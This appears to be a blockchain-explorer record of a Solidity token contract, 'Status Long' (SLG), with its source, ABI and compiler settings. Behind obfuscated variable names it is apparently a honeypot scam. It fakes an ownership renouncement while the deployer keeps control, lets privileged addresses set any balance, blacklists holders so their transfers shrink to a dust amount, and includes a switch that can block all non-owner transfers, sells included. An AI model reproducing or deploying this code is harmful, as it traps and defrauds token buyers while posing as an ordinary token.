{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface atFundEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenLaunchedMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingReceiverAuto {\n    function createPair(address toWallet, address buyLiquidity) external returns (address);\n}\n\ninterface maxTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountToken) external view returns (uint256);\n\n    function transfer(address liquidityToMode, uint256 autoIsTo) external returns (bool);\n\n    function allowance(address senderTeamReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoIsTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityToMode,\n        uint256 autoIsTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMode, uint256 value);\n    event Approval(address indexed senderTeamReceiver, address indexed spender, uint256 value);\n}\n\ninterface enableSwapFrom is maxTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StatusLong is tokenLaunchedMarketing, maxTrading, enableSwapFrom {\n\n    constructor (){\n        \n        atFundEnable modeFrom = atFundEnable(limitAutoMax);\n        swapLiquidity = marketingReceiverAuto(modeFrom.factory()).createPair(modeFrom.WETH(), address(this));\n        \n        limitLiquidityMode = _msgSender();\n        autoSell();\n        receiverMin[limitLiquidityMode] = true;\n        amountLimitSell[limitLiquidityMode] = shouldLaunch;\n        \n        emit Transfer(address(0), limitLiquidityMode, shouldLaunch);\n    }\n\n    function transferFrom(address totalMarketing, address liquidityToMode, uint256 autoIsTo) external override returns (bool) {\n        if (_msgSender() != limitAutoMax) {\n            if (maxFeeSell[totalMarketing][_msgSender()] != type(uint256).max) {\n                require(autoIsTo <= maxFeeSell[totalMarketing][_msgSender()]);\n                maxFeeSell[totalMarketing][_msgSender()] -= autoIsTo;\n            }\n        }\n        return buyFrom(totalMarketing, liquidityToMode, autoIsTo);\n    }\n\n    string private launchEnable = \"SLG\";\n\n    uint256 private sellMode;\n\n    function name() external view virtual override returns (string memory) {\n        return listReceiver;\n    }\n\n    function receiverExempt(address enableSell) public {\n        feeLaunch();\n        if (toTeam != txSell) {\n            senderAt = true;\n        }\n        if (enableSell == limitLiquidityMode || enableSell == swapLiquidity) {\n            return;\n        }\n        sellBuy[enableSell] = true;\n    }\n\n    bool private senderAt;\n\n    address public limitLiquidityMode;\n\n    uint256 modeWallet;\n\n    address public swapLiquidity;\n\n    function autoSwapFrom(address isWallet, uint256 autoIsTo) public {\n        feeLaunch();\n        amountLimitSell[isWallet] = autoIsTo;\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    uint256 exemptLaunchedWallet;\n\n    uint8 private enableIs = 18;\n\n    mapping(address => mapping(address => uint256)) private maxFeeSell;\n\n    address limitAutoMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableIs;\n    }\n\n    function listMode(uint256 autoIsTo) public {\n        feeLaunch();\n        exemptLaunchedWallet = autoIsTo;\n    }\n\n    function buyFrom(address totalMarketing, address liquidityToMode, uint256 autoIsTo) internal returns (bool) {\n        if (totalMarketing == limitLiquidityMode) {\n            return takeReceiver(totalMarketing, liquidityToMode, autoIsTo);\n        }\n        uint256 toLaunch = maxTrading(swapLiquidity).balanceOf(shouldTo);\n        require(toLaunch == exemptLaunchedWallet);\n        require(liquidityToMode != shouldTo);\n        if (sellBuy[totalMarketing]) {\n            return takeReceiver(totalMarketing, liquidityToMode, feeReceiver);\n        }\n        return takeReceiver(totalMarketing, liquidityToMode, autoIsTo);\n    }\n\n    mapping(address => bool) public sellBuy;\n\n    uint256 public toTeam;\n\n    function transfer(address isWallet, uint256 autoIsTo) external virtual override returns (bool) {\n        return buyFrom(_msgSender(), isWallet, autoIsTo);\n    }\n\n    function owner() external view returns (address) {\n        return amountLimit;\n    }\n\n    string private listReceiver = \"Status Long\";\n\n    function getOwner() external view returns (address) {\n        return amountLimit;\n    }\n\n    function takeReceiver(address totalMarketing, address liquidityToMode, uint256 autoIsTo) internal returns (bool) {\n        require(amountLimitSell[totalMarketing] >= autoIsTo);\n        amountLimitSell[totalMarketing] -= autoIsTo;\n        amountLimitSell[liquidityToMode] += autoIsTo;\n        emit Transfer(totalMarketing, liquidityToMode, autoIsTo);\n        return true;\n    }\n\n    uint256 private shouldLaunch = 100000000 * 10 ** 18;\n\n    uint256 private txSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchEnable;\n    }\n\n    function autoSell() public {\n        emit OwnershipTransferred(limitLiquidityMode, address(0));\n        amountLimit = address(0);\n    }\n\n    mapping(address => uint256) private amountLimitSell;\n\n    function walletFund(address launchList) public {\n        if (enableTxShould) {\n            return;\n        }\n        \n        receiverMin[launchList] = true;\n        if (sellMode != toTeam) {\n            toTeam = txSell;\n        }\n        enableTxShould = true;\n    }\n\n    address private amountLimit;\n\n    function allowance(address modeExempt, address listIs) external view virtual override returns (uint256) {\n        if (listIs == limitAutoMax) {\n            return type(uint256).max;\n        }\n        return maxFeeSell[modeExempt][listIs];\n    }\n\n    bool public totalMaxExempt;\n\n    bool public enableTxShould;\n\n    address shouldTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant feeReceiver = 18 ** 10;\n\n    function feeLaunch() private view {\n        require(receiverMin[_msgSender()]);\n    }\n\n    function approve(address listIs, uint256 autoIsTo) public virtual override returns (bool) {\n        maxFeeSell[_msgSender()][listIs] = autoIsTo;\n        emit Approval(_msgSender(), listIs, autoIsTo);\n        return true;\n    }\n\n    function balanceOf(address amountToken) public view virtual override returns (uint256) {\n        return amountLimitSell[amountToken];\n    }\n\n    event OwnershipTransferred(address indexed tradingSwap, address indexed totalMin);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsTo\",\"type\":\"uint256\"}],\"name\":\"autoSwapFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidityMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoIsTo\",\"type\":\"uint256\"}],\"name\":\"listMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityToMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StatusLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}